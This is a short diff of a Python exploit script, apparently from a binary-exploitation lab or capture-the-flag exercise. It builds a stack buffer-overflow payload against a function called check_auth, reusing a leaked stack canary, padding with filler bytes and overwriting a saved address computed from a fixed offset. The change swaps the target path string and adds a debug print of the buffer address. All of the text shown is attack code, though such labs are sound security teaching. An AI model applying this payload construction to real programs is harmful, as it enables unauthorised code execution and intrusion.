@@ -41,7 +41,7 @@ def main():
 	canary = canary.replace('00','3D')
 
 
-	string = "/secet/y" 
+	string = "/secet/x" 
 	path_string = string.encode("utf-8").hex().replace('0x','').upper()
 	num_bytes = 13*4 - len(string)
 	payload = path_string + "3D"*(num_bytes)
@@ -50,6 +50,8 @@ def main():
 	# saved ebp of check_auth - post_data buffer address = 136
 	t = int(saved_ebp, 16) - 136
 	t = hex(t).replace('0x','').upper()
+
+	print("BUFFER ADDRESS = ", t)
 	payload += little_to_big_endian_conversion(t)
 
 	# 1 random word = 4 random bytes
